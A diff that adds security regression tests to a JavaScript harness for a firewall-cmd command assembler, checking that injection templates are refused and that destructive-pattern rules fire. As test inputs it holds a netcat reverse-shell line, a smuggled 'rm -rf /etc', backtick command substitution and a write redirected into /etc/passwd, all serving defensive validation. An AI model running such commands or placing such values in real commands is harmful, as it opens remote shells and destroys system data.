@@ -772,6 +772,123 @@ function main() {
     stats.failures.push("invariant: MCR-SEC-003: headerSafe() does not flatten every line terminator to a space");
   }
 
+  /* ---- MCR-SEC-006: template[].flag and template[].lit are curated, not
+     unchecked. Both injection templates from the review must return null. ---- */
+  var tokenChecks = 0;
+  var badTokenSpecs = [
+    ["flag carries a statement separator",
+     { id: "tok-flag", fields: [{ name: "z", type: "zone", required: true }],
+       template: [{ lit: "firewall-cmd" }, { flag: "--zone; rm -rf /etc; #", field: "z" }] },
+     { z: "public" }],
+    ["lit is a whole second command",
+     { id: "tok-lit", fields: [],
+       template: [{ lit: "echo hi; nc 10.0.0.1 4444 -e /bin/sh" }] },
+     {}],
+    ["flag carries a space",
+     { id: "tok-flag-space", fields: [{ name: "z", type: "zone", required: true }],
+       template: [{ lit: "firewall-cmd" }, { flag: "--zone --permanent", field: "z" }] },
+     { z: "public" }],
+    ["flag carries a quote",
+     { id: "tok-flag-quote", fields: [{ name: "z", type: "zone", required: true }],
+       template: [{ lit: "firewall-cmd" }, { flag: "--zone'", field: "z" }] },
+     { z: "public" }],
+    ["lit carries a backtick",
+     { id: "tok-lit-backtick", fields: [],
+       template: [{ lit: "echo `id`" }] },
+     {}],
+    ["lit carries a redirection",
+     { id: "tok-lit-redir", fields: [],
+       template: [{ lit: "cat>/etc/passwd" }] },
+     {}],
+    ["flag is not a flag at all",
+     { id: "tok-flag-bare", fields: [{ name: "z", type: "zone", required: true }],
+       template: [{ lit: "firewall-cmd" }, { flag: "zone", field: "z" }] },
+     { z: "public" }]
+  ];
+  for (var bt = 0; bt < badTokenSpecs.length; bt++) {
+    for (var btr = 0; btr < VERSIONS.length; btr++) {
+      tokenChecks++;
+      var btres = A.assembleCommand(badTokenSpecs[bt][1], VERSIONS[btr], badTokenSpecs[bt][2],
+                                    { patterns: [] });
+      if (btres !== null) {
+        stats.failures.push("token allow-list / RHEL " + VERSIONS[btr] + " / " +
+                            badTokenSpecs[bt][0] + ": assembled " + JSON.stringify(btres.command) +
+                            " instead of returning null");
+      }
+    }
+  }
+  /* control: the legitimate tokens those hostile ones are variations of still work */
+  for (var gtr = 0; gtr < VERSIONS.length; gtr++) {
+    tokenChecks++;
+    var good = A.assembleCommand(
+      { id: "tok-ok", fields: [{ name: "z", type: "zone", required: true }],
+        template: [{ lit: "firewall-cmd" }, { flag: "--zone", field: "z" }, { lit: "--permanent" }] },
+      VERSIONS[gtr], { z: "public" }, { patterns: [] });
+    if (!good || good.command !== "firewall-cmd --zone='public' --permanent") {
+      stats.failures.push("token allow-list control / RHEL " + VERSIONS[gtr] +
+                          ": a legitimate flag and lit were refused — " +
+                          JSON.stringify(good === null ? null : good.command));
+    }
+  }
+
+  /* ---- MCR-SEC-008: every destructive pattern must be able to fire ---------
+     shQuote() inserts a quote at every literal->value boundary, so a pattern
+     that spans one could never match the post-quoting string. blastFor() now
+     also matches the unquoted projection. Each row of content/dangerous.json is
+     asserted to fire on a synthetic assembled command whose VALUE carries the
+     pattern text; a row that can never fire fails this gate rather than sitting
+     in the table looking like protection. */
+  var patternChecks = 0;
+  var dangerous = JSON.parse(fs.readFileSync(path.join(REPO, "content", "dangerous.json"), "utf8"));
+  var patterns = dangerous.patterns || [];
+  if (!patterns.length) stats.failures.push("content/dangerous.json carries no patterns to check");
+  for (var dp = 0; dp < patterns.length; dp++) {
+    var pat = patterns[dp];
+    patternChecks++;
+    var synth = A.assembleCommand(
+      { id: "blast-" + pat.id, blast: "green",
+        fields: [{ name: "v", type: "comment", required: true }],
+        template: [{ lit: "probe" }, { field: "v" }] },
+      "9", { v: pat.match }, { patterns: patterns });
+    if (synth === null) {
+      stats.failures.push("destructive pattern '" + pat.id + "': its match text could not be put " +
+                          "into a synthetic command, so this row has never been seen to fire");
+      continue;
+    }
+    if (synth.blast !== pat.blast_floor && !(pat.blast_floor === "yellow" && synth.blast === "red")) {
+      stats.failures.push("destructive pattern '" + pat.id + "' (" + JSON.stringify(pat.match) +
+                          ") did not raise blast to " + pat.blast_floor + " on " +
+                          JSON.stringify(synth.command) + " — it fired on nothing");
+    }
+  }
+  /* Marcus's C8 test, verbatim: `rm -rf /` must fire on `rm -rf '/etc/pki'` */
+  patternChecks++;
+  var rmrf = A.assembleCommand(
+    { id: "blast-rm-rf-root", blast: "green",
+      fields: [{ name: "p", type: "path", required: true }],
+      template: [{ lit: "rm" }, { lit: "-rf" }, { field: "p" }] },
+    "9", { p: "/etc/pki" }, { patterns: [{ id: "rm-rf", match: "rm -rf /", label: "l", why: "w",
+                                           blast_floor: "red" }] });
+  if (!rmrf || rmrf.command !== "rm -rf '/etc/pki'") {
+    stats.failures.push("MCR-SEC-008 regression: the synthetic command did not assemble as expected");
+  } else if (rmrf.blast !== "red") {
+    stats.failures.push("MCR-SEC-008 regression: 'rm -rf /' did not fire on " +
+                        JSON.stringify(rmrf.command) + " — a pattern spanning a value boundary is " +
+                        "still silently disabled by the assembler's own quoting");
+  }
+  /* control: a pattern that genuinely does not occur must NOT fire */
+  patternChecks++;
+  var quiet = A.assembleCommand(
+    { id: "blast-quiet", blast: "green",
+      fields: [{ name: "p", type: "path", required: true }],
+      template: [{ lit: "ls" }, { field: "p" }] },
+    "9", { p: "/etc/pki" }, { patterns: [{ id: "rm-rf", match: "rm -rf /", label: "l", why: "w",
+                                           blast_floor: "red" }] });
+  if (!quiet || quiet.blast !== "green") {
+    stats.failures.push("MCR-SEC-008 control: an unrelated command was rated " +
+                        (quiet ? quiet.blast : "null") + " — the de-quoted matcher fires on anything");
+  }
+
   /* ---- positive control -------------------------------------------------
      A validator that rejects everything would pass every assertion above while
      making the product useless, so each field type's benign value must
@@ -914,6 +1031,8 @@ function main() {
     rich_rule_oracles: stats.oracles,
     half_formed_checks: halfFormed,
     clipboard_checks: clipboardChecks,
+    token_allow_list_checks: tokenChecks,
+    destructive_pattern_checks: patternChecks,
     rich_rule_slot_types_refused: richCounts.refusedType,
     rich_rule_slot_types_allowed: richCounts.allowedType,
     positive_controls: controls,
@@ -941,6 +1060,9 @@ function main() {
                 "template shape, all four releases)");
     console.log("  " + clipboardChecks + " clipboard-payload checks: every line '# '-prefixed except " +
                 "the command, no control character survives, blast sees the whole payload");
+    console.log("  " + tokenChecks + " flag/lit allow-list checks and " + patternChecks +
+                " destructive-pattern checks (every row of content/dangerous.json fires on a " +
+                "synthetic assembled command)");
     console.log("  " + controls + " positive controls (benign value per type/release/shape) and " +
                 report.invariants + " invariants");
     var classes = Object.keys(stats.byClass).sort();
